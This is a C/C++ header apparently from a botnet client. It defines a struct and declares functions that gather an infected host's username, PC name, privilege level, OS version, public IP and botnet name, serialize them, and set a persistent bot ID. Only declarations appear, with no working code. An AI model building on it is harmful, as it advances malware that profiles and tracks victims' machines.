#pragma once


//
#define _BOT_VERSION 1 

//
#define BOT_ID_LEN 30
#define BOT_USERNAME_LEN 20
#define BOT_PCNAME_LEN 20
#define BOT_SERVICE_PACK_STRING_LEN 20
#define BOT_IP_ADDRESS_LEN 20
#define BOT_BOTNET_NAME_LEN 20

#define WINDOWS_IGNORE_PACKING_MISMATCH
#pragma pack(1)
typedef struct
{
	char BOT_ID[BOT_ID_LEN];

	char BOT_USERNAME[BOT_USERNAME_LEN];
	char BOT_PCNAME[BOT_PCNAME_LEN];

	int BOT_INTEGRITY_LEVEL = 0;

	int BOT_VERSION = 0;

	int BOT_OSVERSION_MAJOR = 0;
	int BOT_OSVERSION_MINOR = 0;
	int BOT_OSVERSION_BUILD_NUMBER = 0;

	char BOT_SERVICE_PACK_STRING[BOT_SERVICE_PACK_STRING_LEN];

	int BOT_OSVERSION_IS_X64 = 0; // 1: Yes 0: No

	char BOT_IP_ADDRESS[BOT_IP_ADDRESS_LEN];
	char BOT_BOTNET_NAME[BOT_BOTNET_NAME_LEN];

	int BOT_IS_WINDOWS_SERVER = 0; // 1: Yes 0: No
} BOT_INFORMATION;
#pragma pack(pop)

//
bool bot_get_bot_id(char *ret);
bool bot_get_current_username(char* ret);
bool bot_get_pcname(char* ret);
bool bot_get_integrity_level(int* ret);
void bot_get_bot_version(int* ret);
bool bot_get_bot_os_version_info(int* bot_osversion_major, int* bot_osversion_minor, int* bot_osversion_build_numder, char* service_pack_string);
void bot_get_bot_os_arch(int* ret);
bool bot_get_bot_public_ip_address(char* ret);
void bot_get_botnet_name(char* ret);


//
void print_bot_info(BOT_INFORMATION bot_info);
char* bot_info_2_buffer(BOT_INFORMATION bot_info, int* buffer_size);

//
bool is_bot_id_existed();
char* get_bot_id();
bool set_bot_id(char* bot_id);